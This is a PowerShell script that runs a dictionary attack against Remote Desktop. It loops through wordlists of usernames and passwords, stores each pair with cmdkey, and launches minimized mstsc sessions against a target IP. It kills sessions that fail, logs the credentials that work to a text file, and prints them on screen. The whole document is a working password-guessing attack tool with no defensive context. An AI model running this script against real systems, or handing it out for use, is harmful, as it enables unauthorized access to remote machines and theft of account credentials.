<#
.SYNOPSIS
bruteforceExchange.ps1 - dictionary attack on remote desktop

.DESCRIPTION 
This PowerShell script will execute a dictionary attack on remote desktop.
#>

#...................................
# Variables
#...................................

$myDir = [Environment]::CurrentDirectory
$users = Get-Content "$mydir\wordlist\users.txt"
$passwords = Get-Content "$mydir\wordlist\passwords.txt"
$counter = 1
$count = $passwords.Count
$IP = "" #enter IP address of remote server here

#...................................
# Script
#...................................

function clearRDPSessions([string]$found){
    start-sleep 2
    Get-Process mstsc -ErrorAction SilentlyContinue | Where-Object {($_.CPU -le 1.5)} | Stop-Process
    start-sleep 1
    $id = Get-Process mstsc -ErrorAction SilentlyContinue | select Id 
    if($id){
        $found = "yes"
        $credentials = $credentialsRDP | Where-Object {($_.Id -like $id.Id)} | select username, password
        $username = $credentials.username
        $userpassword = $credentials.password
        echo "the user $username and password $userpassword are a valid credenatial." >> "$mydir\credentialsRDP.txt"
        write-host "password of $username is $userpassword `r`n" -ForegroundColor Green
        Get-Process mstsc | Stop-Process
        return $found
    }
}

$credentialsRDP = @()
 foreach($user in $users){
    :found foreach($password in $passwords){
        Write-Host "attempt $counter/$count for $user" -ForegroundColor yellow 
        cmdkey /generic:$IP /user:$user /pass:$password 
        $process = Start-Process mstsc /v:$IP -WindowStyle Minimized -PassThru
        $credentialsRDP += $process | select Id, @{n='username';e={$user}}, @{n='password';e={$password}}
        write-host "trying password $password `r`n" -ForegroundColor yellow
        start-sleep 1
        if($counter % 25 -eq 0){
            $found = clearRDPSessions
            if($found -eq "yes"){
                $counter = 1
                break found
            }
        }
        $counter ++
    }
    clearRDPSessions
}
